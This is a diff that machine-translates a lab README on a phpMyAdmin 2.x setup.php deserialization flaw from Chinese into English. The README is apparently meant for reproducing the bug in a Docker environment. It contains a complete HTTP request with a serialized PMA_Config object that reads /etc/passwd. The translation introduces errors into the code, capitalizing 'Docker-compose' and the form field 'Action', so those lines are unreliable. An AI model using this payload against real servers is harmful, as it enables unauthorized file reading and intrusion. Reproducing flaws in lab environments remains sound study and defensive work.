@@ -1,20 +1,20 @@
-# phpmyadmin scripts/setup.php 反序列化漏洞（WooYun-2016-199433）
+# phpmyadmin scripts/setup.php Deserialization Vulnerability (WooYun-2016-199433)
 
-phpmyadmin 2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。
+There is a deserialization vulnerability in phpmyadmin 2.x that allows an attacker to read arbitrary files or execute arbitrary code.
 
-## 环境搭建
+## Environment Building
 
-执行如下命令启动phpmyadmin：
+Run the following command to start phpmyadmin:
 
 ```
-docker-compose up -d
+Docker-compose up -d
 ```
 
-环境启动后，访问`http://your-ip:8080`，即可看到phpmyadmin的首页。因为没有连接数据库，所以此时会报错，但我们这个漏洞的利用与数据库无关，所以忽略。
+After the environment starts, visit `http://your-ip:8080` and you will see the phpmyadmin home page. Because there is no connection to the database, we will report an error at this time, but the use of this vulnerability is not related to the database, so it is ignored.
 
-## 漏洞复现
+## Vulnerability recurrence
 
-发送如下数据包，即可读取`/etc/passwd`：
+Send the following packet to read `/etc/passwd`:
 
 ```
 POST /scripts/setup.php HTTP/1.1
@@ -27,7 +27,7 @@ Connection: close
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 80
 
-action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
+Action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
 ```
 
 ![](1.png)
